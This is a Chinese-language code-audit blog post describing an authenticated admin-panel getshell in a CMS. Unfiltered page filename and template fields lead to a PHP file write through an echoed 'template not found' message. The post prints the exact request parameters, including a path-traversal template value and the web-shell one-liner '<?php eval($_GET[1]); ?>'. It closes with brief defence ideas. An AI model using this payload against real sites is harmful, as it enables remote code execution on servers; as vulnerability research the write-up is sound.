> 原文链接: https://www.anquanke.com//post/id/179357 


# 记一次某 CMS 的后台 getshell


                                阅读量   
                                **240998**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">11</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t01eb80efd06013d7bf.png)](https://p2.ssl.qhimg.com/t01eb80efd06013d7bf.png)



## 前言

出于对审计的热爱，最近审了一下某 `cms`，审出了个后台 `getshell`，虽然危害不算太大，但是过程很有意思，在这里分享一下。



## 漏洞发现

### <a class="reference-link" name="%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"></a>代码审计

翻翻找找中找到了，这个函数：

```
function saxue_writefile( $_fileurl, $_data, $_method = "wb" ) `{`
    $_fileopen = @fopen( $_fileurl, $_method ); // 尝试打开文件
    if ( !$_fileopen ) `{`
        return false;
    `}` 
    @flock( $_fileopen, LOCK_EX );
    $_ret = @fwrite( $_fileopen, $_data ); // 写入内容
    @flock( $_fileopen, LOCK_UN );
    @fclose( $_fileopen );
    @chmod( $_fileurl, 511 );
    return $_ret;
`}`
```

这是个纯洁的函数，没有任何的过滤，第一个参数是 `文件名`，第二个参数是 `内容`，这和 `file_put_contents` 函数一样。

现在我们有个 “高危函数”，我们可以找找哪里调用了他， 又经过了很多次翻翻找找，在 `adminpages.php` 下有一段引起了我的注意：

```
case 'html':
        ...    
    $row = `从 pages 数据表中获取值`;
    saxue_writefile( 
        $filepath . '/' . $row['filename'] , 
        $saxueTpl -&gt; fetch( SAXUE_THEME_PATH . '/pages/' . $row['template'] ) 
    );
        ...
```

这里省略了大部分代码，留下了两行关键的。

之所以注意起这行代码，是因为我看到这个最后的 `$row['filename']`。我就基本盲猜他是从数据库中拿出来的，这就说明了，我们有可能可以通过后台某项设置控制它。

然后我们看看第二个参数也是从 `row` 取出来的，当然，你会看到第二个参数还经过了一个函数： `$saxueTpl -&gt; fetch` 。

由于他取出来的是 `template` 而且是 `fetch` 函数，我再一次盲猜他是获取文件内容的，这里暂时先不跟。

现在我们来看看这两个数值到底能不能控制，在 `case html` 下面，紧跟着的是 `case add`，我们来看看这个 `case add`。

```
case 'add':
    $row = array();
    if ( isset( $_POST['dosubmit'] ) ) `{`
            $_POST['item'] = strtolower( trim( $_POST['item'] ) );
            $_POST['title'] = trim( $_POST['title'] );
            $_POST['content'] = trim( $_POST['content'] );
            $_POST['htmldir'] = trim( $_POST['htmldir'] );
            $_POST['htmlurl'] = trim( $_POST['htmlurl'] );
            $_POST['filename'] = trim( $_POST['filename'] );
            if ( isset( $_REQUEST['id'] ) ) `{`
                $data = $data_handler -&gt; create( false ); // 编辑时调用到此处
            `}` else `{`
                $data = $data_handler -&gt; create(); // 根据 $_POST 创建一个数组，方便插入。
            `}` 
            if ( !$data_handler -&gt; insert( $data ) ) `{` // 插入 $data ，即 $_POST 的数据
                saxue_printfail( LANG_ERROR_DATABASE );
            `}`
```

果不其然，我们在这里看到了我们的 `filename`，在下面 `insert` 了，其间没有任何过滤。

当然你还会看这里没有 `template`，但是真的没有吗？我们可以测试看看。

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95"></a>漏洞测试

实践是检验真理的唯一标准。

访问后台的 `pages.php`：

[![](https://p0.ssl.qhimg.com/t01254eebd4b1455434.png)](https://p0.ssl.qhimg.com/t01254eebd4b1455434.png)

点击添加单页，然后抓包：

[![](https://p4.ssl.qhimg.com/t01ad384bb133435bdb.png)](https://p4.ssl.qhimg.com/t01ad384bb133435bdb.png)

[![](https://p0.ssl.qhimg.com/t0143ac6fbf8d2bcc80.png)](https://p0.ssl.qhimg.com/t0143ac6fbf8d2bcc80.png)

当然，能不能任意改值呢？比如 `filename` 改成 `.php` 后缀，`template` 改成别的路径的文件可以嘛？

我们试试：

[![](https://p3.ssl.qhimg.com/t01d0908c712c7f97ef.png)](https://p3.ssl.qhimg.com/t01d0908c712c7f97ef.png)

数据库：

[![](https://p5.ssl.qhimg.com/t01d1f8aadd647d2299.png)](https://p5.ssl.qhimg.com/t01d1f8aadd647d2299.png)

最后我们要验证 `fetch` 函数到底是不是获取文件内容的，我们也不需要跟进函数内部，直接测试就好。

我们看到 `联系我们` 这个 `template` 是 `about.html`。我们去改一下 `about.html` 试试看：

[![](https://p1.ssl.qhimg.com/t014f77d932798220eb.png)](https://p1.ssl.qhimg.com/t014f77d932798220eb.png)

然后此时触发那个 `case html` 下的代码。其实就是 `pages.php` 下的这个功能 ：

[![](https://p0.ssl.qhimg.com/t01c7a605ba6d7471ad.png)](https://p0.ssl.qhimg.com/t01c7a605ba6d7471ad.png)

生成一下：

[![](https://p5.ssl.qhimg.com/t01bd6d3f9075223f75.png)](https://p5.ssl.qhimg.com/t01bd6d3f9075223f75.png)

成功了。。现在我们可以兴高采烈地去写 `shell` 了。



## 漏洞复现

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"></a>漏洞利用

想一下怎么利用，因为我们现在也没有文件可以给我们控制。

其实我们很容易想到上传一个图片文件，然后读取文件图片写 `shell` ，上手试试，那么哪里可以上传图片呢？第一个想到的当然是写文章的地方啊：

[![](https://p2.ssl.qhimg.com/t0163d59ed722f8be82.png)](https://p2.ssl.qhimg.com/t0163d59ed722f8be82.png)

[![](https://p1.ssl.qhimg.com/t01774ee87adc14b282.png)](https://p1.ssl.qhimg.com/t01774ee87adc14b282.png)

然后我们这时候用刚刚抓到的包再添加一个，构造一下 `参数`：

```
filename=test.php
template=../../../../attachs/image/1905/2722001482207.png
```

这里 `template` 是根据相对路径写出来的。

[![](https://p4.ssl.qhimg.com/t01bb9a881c59935521.png)](https://p4.ssl.qhimg.com/t01bb9a881c59935521.png)

生成一下，访问，满心欢喜的期待着我们的 `shell` 出现：

[![](https://p4.ssl.qhimg.com/t01ec9c2fb163e9eabb.png)](https://p4.ssl.qhimg.com/t01ec9c2fb163e9eabb.png)

What？出现了什么问题，我们去看看生成出来的文件（`/about/test.php`）：

[![](https://p3.ssl.qhimg.com/t017a2d7a5c3bb6438f.png)](https://p3.ssl.qhimg.com/t017a2d7a5c3bb6438f.png)

为什么我们的文件名没了一半？看看数据库：

[![](https://p4.ssl.qhimg.com/t01672dd531bbfed639.png)](https://p4.ssl.qhimg.com/t01672dd531bbfed639.png)

没错，我们的字段限制了长度：

[![](https://p0.ssl.qhimg.com/t01863fdb384b228a96.png)](https://p0.ssl.qhimg.com/t01863fdb384b228a96.png)

在思考片刻后，我突然想到：`文件名输出在了我们的 php 中`

没错，我们可以把文件名写成一个 `shell`，这样我们就可以连图片也不用上传了。

改改参数：

```
filename=test.php
template=&lt;?php eval($_GET[1]); ?&gt;
```

再次重复刚刚的步骤，修改，然后生成：

[![](https://p5.ssl.qhimg.com/t0191b64dd394324afd.png)](https://p5.ssl.qhimg.com/t0191b64dd394324afd.png)

成功了。。

访问 `/about/test.php` 试试：

[![](https://p4.ssl.qhimg.com/t0102ab99036477bc55.png)](https://p4.ssl.qhimg.com/t0102ab99036477bc55.png)



## 字符串溯源

当然，这是一篇 `审计区` 的文章，秉着求知欲，我们看看这个字符串哪里来的。

回到一开始 `pages.php` 下 `case html`，就是这句话：

```
saxue_writefile( 
    $filepath . '/' . $row['filename'], 
    $saxueTpl -&gt; fetch( SAXUE_THEME_PATH . '/pages/' . $row['template'] ) 
);
```

我们跟进 `fetch` 函数。

（这里因为代码比较多，我用了 `XBEBUG` 找到了关键位置。）

关键位置：

```
ob_start();
if( 
    $this -&gt; _is_compiled( $template_file, $_template_compile_path ) || 
    $this -&gt; _compile_resource( $template_file, $_template_compile_path 
))
`{`
    include( $_template_compile_path . $this -&gt; _compile_prefix );
`}` 
$_template_results = ob_get_contents();
ob_end_clean();
```

倒数第二行的 `$_template_results` 就是返回值，这里是从 `ob_get_contents` 获取的。也就是缓冲区，但是从 `ob_start` 处到 `ob_get_contents` 就经历了一个 `if` 和一个 `include`。

我们先看看 `if` 的第一个条件：

`$this -&gt; _is_compiled( $template_file, $_template_compile_path )`

这里说明一下第一个参数是我们数据库里 `template` 的值。

跟进一下 `_is_compiled` 函数：

```
public function _is_compiled( $tpl_file, $compile_path ) `{`
    ....
    if ( !is_file( $tpl_file ) ) `{`
        return false;
    `}` 
    ...
`}`
```

这里依然省略了一些代码，因为正常来说就是判断了 `$tpl_file` 是否存在，由于我们写的是一句话，所以不可能是文件，返回 `false`。

因为是 `||`，那么就会进入第二个判断：

`$this -&gt; _compile_resource( $template_file, $_template_compile_path )`

跟进 `_compile_resource` 函数：

```
public function _compile_resource( $tpl_file, $compile_path ) `{`
    if ( !is_file( $tpl_file ) ) `{`
        echo "Template file (" . str_replace( SAXUE_ROOT_PATH, "", $tpl_file ) . ") is not exists!";
        return false;
    `}`
```

没错，这里还是判断了是否是文件，如果不是就输出 `模板文件 $tpl_file 不存在`，这句话里带有我们的文件名，此处的 `str_replace` 替换了一个无关紧要路径。

跳出函数，因为我们在 `_compile_resource` 函数内 `echo` 输出到了缓冲区。所以在下面获取的时候缓冲区内的数据就是：

`Template file (/templates/pc/pages/&lt;?php eval($_GET[1]); ?&gt;) is not exists!`

```
ob_start();
if ( 
    $this -&gt; _is_compiled( $template_file, $_template_compile_path ) 
|| 
    $this -&gt; _compile_resource( $template_file, $_template_compile_path  // 如果文件不存在，输出一句带有文件名的话，存入缓冲区
)) `{`
    include( $_template_compile_path . $this -&gt; _compile_prefix );
`}` 
$_template_results = ob_get_contents(); // 获取缓冲区的值，接下来会返回
```

此时这个字符串就被我们纯洁的 `saxue_writefile`，写进纯洁的 `test.php` 里了。



## 总结

这个漏洞其实还是很简单的，防御的话，我觉得可以在 `fetch` 函数中判断是否有一些特殊字符，或者干脆在找不到模板的时候干脆不输出文件名。其实我觉得应该还可以更好的防御方法，但是由于水平有限，希望表哥们如果有更好的方法可以一起探讨交流。
